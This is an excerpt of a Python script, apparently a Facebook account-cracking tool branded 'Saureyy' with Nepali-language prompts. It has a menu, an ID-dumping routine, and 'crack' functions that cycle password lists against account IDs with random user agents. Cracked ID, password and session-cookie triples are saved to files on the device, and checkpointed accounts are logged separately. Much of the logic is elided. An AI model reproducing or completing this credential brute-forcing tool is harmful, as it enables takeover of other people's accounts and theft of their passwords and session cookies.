...
logo =f"""
   ____                           
  / __/__ ___ _________ __ ____ __
 _\ \/ _ `/ // / __/ -_) // / // /
/___/\_,_/\_,_/_/  \__/\_, /\_, / 
                      /___//___/\033[1;36m11.2 \033[1;37m
\033[1;37m——————————————————————————————————————\x1b[1;97m
...
def menu():
    ...
    line()
    saureyyyy = input('\033[1;37m(\u001b[36m>\033[1;37m) CHOOSE : ')
    if saureyyyy in ['1']:
    	line()
    	dump()
    elif saureyyyy in ['2']:	
...
def remove_dub():
    ...
    line()
    print(' (\u001b[36m>\033[1;37m) EXAMPLE : /sdcard/SAURAV.txt')
    line()
...
def dump():
 ...
 try: 	
     ...
     line();print(' (\u001b[36m>\033[1;37m) SAHI VALUE HAL TA VAI😑');time.sleep(3)
     back()
 if jum<1 or jum>1000:
     line();print(' (\u001b[36m>\033[1;37m) LIMIT VANDA BAHIRA PUGIS DHOTI😂');time.sleep(3)
     back()
 ses=requests.Session()
 line()
 yz = 0
...
def crack(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}(Saureyy){P} ({P}{loop}{P}-{P}{len(id)}{P}) (OK{P}-{H}{ok}{P}) ({'{:.0%}'.format(loop/float(len(id)))}{P})"),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
               if 'y' in cpxx:
                print(f'\r{P} {K}({M}Saureyy-Check{K}){P} {M}{idf} {P}>{M} {pw} {P}>{M} {saurabh(idf)}{P}')   
                open('/sdcard/Saureyy/SAURAV-CP.txt', 'a').write(idf+'|'+pw+'\n')
                cp+=1
                break
                ...
                open('/sdcard/Saureyy/SAURAV-OK.txt', 'a').write(idf+'|'+pw+'|'+kuki+'\n')     
                print(f'\r{P} {K}({H}Saureyy-Firee{K}){P} {H}{idf} {P}>{H} {pw} {P}>{H} {saurabh(idf)}{P}')                
                if 'y' in cooki:
...
def crack2(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}(Saureyy){P} ({P}{loop}{P}-{P}{len(id)}{P}) (OK{P}-{H}{ok}{P}) (CP{P}-{m}{cp}{P}) ({'{:.0%}'.format(loop/float(len(id)))}{P})"),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
